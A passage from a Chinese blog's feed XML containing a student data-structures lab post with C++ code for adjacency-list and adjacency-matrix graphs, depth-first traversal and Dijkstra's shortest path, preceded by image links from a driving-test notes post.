alt="image-20200517205912556"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzIwNTUzOTIzNi5wbmc?x-oss-process=image/format,png"  alt="image-20200517205539236"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzIxMDg1NTk1NC5wbmc?x-oss-process=image/format,png"  alt="image-20200517210855954"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxODE5MzU1MjgwNy5wbmc?x-oss-process=image/format,png"  alt="image-20200518193552807"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxODIxMjYyMzAzMy5wbmc?x-oss-process=image/format,png"  alt="image-20200518212623033"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbWFzdGVyL2ltYWdlcy9pbWFnZS0yMDIwMDUyMDE2MDYzMzg0MS5wbmc?x-oss-process=image/format,png"  alt="image-20200520160633841"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbWFzdGVyL2ltYWdlcy9pbWFnZS0yMDIwMDUyNDE3MjgyMzUyNi5wbmc?x-oss-process=image/format,png"  alt="image-20200524172823526"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbWFzdGVyL2ltYWdlcy9pbWFnZS0yMDIwMDUyNDE3MzQ0NTE5OS5wbmc?x-oss-process=image/format,png"  alt="image-20200524173445199"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xie-zai-qian-mian&quot;&gt;写在前面&lt;/h1&gt;
&lt;p&gt;科目一今天满分飘过，特此分享下自己打的笔记。&lt;br&gt;
如果你想问我只是科目一而已用的着那么认真吗，别问，问就是因为没复习挂过一次。&lt;br&gt;
之所以写这篇文章的原因是提醒大家当时我是过了全部题后之后只做
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>实验五 图的操作</title>
    <link href="http://zssblog.top/2020/05/31/%E5%AE%9E%E9%AA%8C%E4%BA%94-%E5%9B%BE%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
    <id>http://zssblog.top/2020/05/31/%E5%AE%9E%E9%AA%8C%E4%BA%94-%E5%9B%BE%E7%9A%84%E6%93%8D%E4%BD%9C/</id>
    <published>2020-05-31T10:00:00.000Z</published>
    <updated>2020-05-31T10:06:08.736Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shi-yan-xing-zhi-zong-he-xing-shi-yan">实验性质：综合性实验</h1><h1 id="yao-qiu">要求：</h1><p>（1）采用邻接矩阵/邻接表建立图；<br>（2）采用深度优先/广度优先搜索方式遍历图；<br>（3）编程实现Dijkstra最短路径算法。</p><h1 id="mu-de">目的：</h1><p>（1）掌握图的邻接矩阵和邻接表存储方式；<br>（2）掌握图的遍历算法；<br>（3）掌握图的实际应用——最短路径算法。</p><h1 id="dai-ma">代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//***邻接矩阵***//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxInt 32767                 <span class="comment">//表示极大值，即∞</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MVNum 100                   <span class="comment">//最大顶点数</span></span></span><br><span class="line"><span class="keyword">bool</span> visited[MVNum],visited2[MVNum];    <span class="comment">//初始化标志数组，值为false</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> VertexType;         <span class="comment">//假设顶点的数据类型为字符型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ArcType;                  <span class="comment">//假设边的权值类型为整型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  VertexType vexs[MVNum];               <span class="comment">//顶点表</span></span><br><span class="line">  ArcType arcs[MVNum][MVNum];       <span class="comment">//邻接矩阵</span></span><br><span class="line">  <span class="keyword">int</span> vexnum,arcnum; <span class="comment">//图的顶点数和边数</span></span><br><span class="line">&#125;AMGraph;</span><br><span class="line"></span><br><span class="line"><span class="comment">//***邻接表***//</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span>  //边结点</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> adjvex; <span class="comment">//该边所指向的顶点的位置</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> * <span class="title">nextarc</span>;</span>   <span class="comment">//指向下一条边的指针</span></span><br><span class="line">    <span class="keyword">int</span> info; <span class="comment">//和边相关的信息</span></span><br><span class="line">&#125;ArcNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VNode</span>    //顶点信息</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    ArcNode * firstarc; <span class="comment">//指向第一条依附该顶点的边的指针</span></span><br><span class="line">&#125;VNode,AdjList [MVNum]; <span class="comment">//AdjList表示邻接表类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    AdjList vertices;</span><br><span class="line">    <span class="keyword">int</span> vexnum,arcnum; <span class="comment">//图的当前顶点数和边数</span></span><br><span class="line"></span><br><span class="line">&#125;ALGraph;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateVex</span><span class="params">(ALGraph G,<span class="keyword">int</span> u)</span></span>; <span class="comment">//返回顶点u在图G中的位置</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateUDG</span><span class="params">(ALGraph &amp;G)</span></span>;<span class="comment">//邻接表建立无向图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS_AL</span><span class="params">(ALGraph &amp;G,<span class="keyword">int</span> v)</span></span>;<span class="comment">//邻接表表示图的深度优先搜索遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateUDN</span><span class="params">(AMGraph &amp;G2)</span></span>;  <span class="comment">//邻接矩阵法建立有向图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS_AM</span><span class="params">(AMGraph &amp;G2,<span class="keyword">int</span> v)</span></span>; <span class="comment">//邻接矩阵深度优先搜索遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShortestPath_DIJ</span><span class="params">(AMGraph G, <span class="keyword">int</span> v0)</span></span>;   <span class="comment">//Dijkstra算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>;  <span class="comment">//文字菜单提示信息</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ALGraph G;</span><br><span class="line">    AMGraph G2;</span><br><span class="line">    Menu();</span><br><span class="line">    <span class="keyword">int</span> v=<span class="number">0</span>,v0=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;  <span class="comment">//输入的数字</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                CreateUDG(G);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                DFS_AL(G,v);</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                CreateUDN(G2);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                DFS_AM(G2,v);</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                ShortestPath_DIJ(G2,v0);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">if</span>(i&lt;<span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入的位置非法，请重新输入"</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入操作代码："</span>;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateVex</span><span class="params">(ALGraph G,<span class="keyword">int</span> u)</span> <span class="comment">//返回顶点u在图G中的位置</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; G.vexnum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (u == G.vertices[i].data)</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateVex</span><span class="params">(AMGraph G2,<span class="keyword">int</span> u)</span> <span class="comment">//返回顶点u在图G中的位置</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;G2.vexnum; i++)</span><br><span class="line">        <span class="keyword">if</span>(u==G2.vexs[i])</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateUDG</span><span class="params">(ALGraph &amp;G)</span>  <span class="comment">//邻接表法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入总顶点数，总边数:"</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;G.vexnum&gt;&gt;G.arcnum;    <span class="comment">//总顶点数，总边数</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入顶点值:"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;G.vexnum;i++) <span class="comment">//输入各点，构造表头结点表</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;G.vertices[i].data;    <span class="comment">//输入顶点值</span></span><br><span class="line">        G.vertices[i].firstarc=<span class="literal">NULL</span>;    <span class="comment">//初始化表头结点的指针域为NULL</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入每条边依附的两个顶点:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;G.arcnum;++k) <span class="comment">//输入各边，构造邻接表</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> v1,v2;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;v1&gt;&gt;v2;    <span class="comment">//输入一条边依附的两个顶点</span></span><br><span class="line">        <span class="keyword">int</span> i=LocateVex(G,v1); <span class="keyword">int</span> j=LocateVex(G,v2);</span><br><span class="line">        <span class="comment">//确定v1和v2在G中位置，即顶点在G.vertices中的序号</span></span><br><span class="line">        ArcNode *p1=<span class="keyword">new</span> ArcNode; <span class="comment">//生成一个新的边结点</span></span><br><span class="line">        p1-&gt;adjvex=j;   <span class="comment">//邻接点序号为j</span></span><br><span class="line">        p1-&gt;nextarc=G.vertices[i].firstarc; G.vertices[i].firstarc=p1;</span><br><span class="line">        <span class="comment">//将新节点*p1插入v1的边表头部</span></span><br><span class="line">        ArcNode *p2=<span class="keyword">new</span> ArcNode; <span class="comment">//生成另一个对称的新节点*p2</span></span><br><span class="line">        p2-&gt;adjvex=i;   <span class="comment">//邻接点序号为i</span></span><br><span class="line">        p2-&gt;nextarc=G.vertices[j].firstarc; G.vertices[j].firstarc=p2;</span><br><span class="line">        <span class="comment">//将新节点p2插入顶点v1的边表头部</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"创建成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS_AL</span><span class="params">(ALGraph &amp;G,<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//图G为邻接表类型，从第v个顶点出发深度优先搜索遍历图G</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;v;visited[v]=<span class="literal">true</span>; <span class="comment">//访问第v个顶点，并置访问标志数组相应分量值为true</span></span><br><span class="line">    ArcNode *p=G.vertices[v].firstarc;   <span class="comment">//p指向v的第一个边结点</span></span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)  <span class="comment">//边结点非空</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> w=p-&gt;adjvex;    <span class="comment">//表示w是v的邻接点</span></span><br><span class="line">        <span class="keyword">if</span>(!visited[w])</span><br><span class="line">            DFS_AL(G,w); <span class="comment">//如果w未访问，则递归调用DFS_AL</span></span><br><span class="line">        p=p-&gt;nextarc;   <span class="comment">//p指向下一个边结点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateUDN</span><span class="params">(AMGraph &amp;G2)</span>  <span class="comment">//邻接矩阵法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//采用邻接矩阵表示法，创建无向网G</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入总顶点数，总边数:"</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;G2.vexnum&gt;&gt;G2.arcnum;  <span class="comment">//输入总顶点数，总边数</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入顶点值:"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;G2.vexnum; ++i)</span><br><span class="line">       <span class="built_in">cin</span>&gt;&gt;G2.vexs[i];                         <span class="comment">//依次输入顶点的信息</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;G2.vexnum;++i) <span class="comment">//初始化邻接矩阵，边的权值均为极大值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j&lt;G2.vexnum;++j)</span><br><span class="line">            G2.arcs[i][j] = MaxInt;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入每条边依附的顶点及权值:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k&lt;G2.arcnum;++k)</span><br><span class="line">    &#123; <span class="comment">//构造邻接矩阵</span></span><br><span class="line">      <span class="keyword">int</span> v1,v2,w;</span><br><span class="line">      <span class="built_in">cin</span>&gt;&gt;v1&gt;&gt;v2&gt;&gt;w; <span class="comment">//输入一条边依附的顶点及权值</span></span><br><span class="line">      <span class="keyword">int</span> i = LocateVex(G2, v1);</span><br><span class="line">      <span class="keyword">int</span> j = LocateVex(G2, v2);  <span class="comment">//确定v1和v2在G中的位置</span></span><br><span class="line">      G2.arcs[i][j] = w;  <span class="comment">//边&lt;v1, v2&gt;的权值置为w2</span></span><br><span class="line">      <span class="comment">//取消下面注释即建立无向图</span></span><br><span class="line">      <span class="comment">//G2.arcs[j][i] = G2.arcs[i][j]; //置&lt;v1, v2&gt;的对称边&lt;v2, v1&gt;的权值为w</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"创建成功"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS_AM</span><span class="params">(AMGraph &amp;G2, <span class="keyword">int</span> v)</span></span>&#123;  <span class="comment">//图G2为邻接矩阵类型</span></span><br><span class="line">  <span class="built_in">cout</span>&lt;&lt;v;</span><br><span class="line">  visited2[v] = <span class="literal">true</span>;   <span class="comment">//访问第v个顶点</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> w = <span class="number">0</span>; w&lt; G2.vexnum; w++) <span class="comment">//依次检查邻接矩阵v所在的行</span></span><br><span class="line">        <span class="keyword">if</span>((G2.arcs[v][w]!=MaxInt) &amp;&amp; (!visited2[w]))</span><br><span class="line">            DFS_AM(G2, w);</span><br><span class="line">      <span class="comment">//w是v的邻接点，如果w未访问，则递归调用DFS</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShortestPath_DIJ</span><span class="params">(AMGraph G, <span class="keyword">int</span> v0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> S[MVNum];<span class="keyword">int</span> D[MVNum],Path[MVNum];</span><br><span class="line">    <span class="comment">//用Dijkstra算法求有向网G的v0顶点到其余顶点的最短路径</span></span><br><span class="line">    <span class="keyword">int</span> n=G.vexnum;                         <span class="comment">//n为G中顶点的个数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> v = <span class="number">0</span>; v&lt;n; ++v)</span><br><span class="line">    &#123;               <span class="comment">//n个顶点依次初始化</span></span><br><span class="line">       S[v] = <span class="literal">false</span>;                    <span class="comment">//S初始为空集</span></span><br><span class="line">       D[v] = G.arcs[v0][v];            <span class="comment">//将v0到各个终点的最短路径长度初始化</span></span><br><span class="line">       <span class="keyword">if</span>(D[v]&lt; MaxInt)  Path [v]=v0; <span class="comment">//v0和v之间有弧，将v的前驱置为v0</span></span><br><span class="line">       <span class="keyword">else</span> Path [v]=<span class="number">-1</span>;                <span class="comment">//如果v0和v之间无弧，则将v的前驱置为-1</span></span><br><span class="line">    &#125;</span><br><span class="line">    S[v0]=<span class="literal">true</span>;                     <span class="comment">//将v0加入S</span></span><br><span class="line">    D[v0]=<span class="number">0</span>;                        <span class="comment">//源点到源点的距离为0</span></span><br><span class="line">    <span class="comment">/*―开始主循环，每次求得v0到某个顶点v的最短路径，将v加到S集―*/</span></span><br><span class="line">    <span class="keyword">int</span> v=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n; ++i)</span><br><span class="line">    &#123;<span class="comment">//对其余n?1个顶点，依次进行计算</span></span><br><span class="line">        <span class="keyword">int</span> min= MaxInt;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> w=<span class="number">0</span>;w&lt;n; ++w)</span><br><span class="line">          <span class="keyword">if</span>(!S[w]&amp;&amp;D[w]&lt;min)</span><br><span class="line">              &#123;v=w; min=D[w];&#125; <span class="comment">//选择一条当前的最短路径，终点为v</span></span><br><span class="line">        S[v]=<span class="literal">true</span>; <span class="comment">//将v加入S</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> w=<span class="number">0</span>;w&lt;n; ++w)</span><br><span class="line">           <span class="comment">//更新从v0出发到集合V?S上所有顶点的最短路径长度</span></span><br><span class="line">            <span class="keyword">if</span>(!S[w]&amp;&amp;(D[v]+G.arcs[v][w]&lt;D[w]))</span><br><span class="line">            &#123;</span><br><span class="line">                D[w]=D[v]+G.arcs[v][w];     <span class="comment">//更新D[w]</span></span><br><span class="line">                Path [w]=v;                     <span class="comment">//更改w的前驱为v</span></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"以v0为起点的图的最短路径为:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;G.vexnum;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"v0-&gt;v"</span>&lt;&lt;i&lt;&lt;<span class="string">":"</span>;</span><br><span class="line">        <span class="keyword">if</span>(D[i]!=MaxInt) <span class="comment">//可以到达</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;D[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"不可达，无最短路径"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"****by 夏日****"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"1-----邻接表建立无向图 "</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"2-----邻接表表示图的深度优先搜索遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"3-----邻接矩阵建立有向图 "</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"4-----邻接矩阵表示图的深度优先搜索遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"5-----迪杰斯特拉算法计算最短路径(先用邻接矩阵建立有向图)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"   